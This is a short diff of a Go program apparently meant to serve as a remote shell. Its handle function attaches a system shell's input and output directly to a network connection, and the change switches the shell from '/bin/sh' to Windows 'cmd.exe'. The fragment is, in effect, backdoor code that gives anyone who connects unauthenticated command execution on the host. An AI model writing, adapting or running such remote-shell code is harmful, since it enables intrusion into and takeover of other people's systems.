@@ -28,7 +28,7 @@ func main() {
 func handle(conn net.Conn) {
 	defer conn.Close()
 
-	cmd := exec.Command("/bin/sh")
+	cmd := exec.Command("cmd.exe")
 
 	cmd.Stdin = conn
 	cmd.Stdout = conn
@@ -38,3 +38,4 @@ func handle(conn net.Conn) {
 		fmt.Println("Can not open cmd, error:", err)
 	}
 }
+	
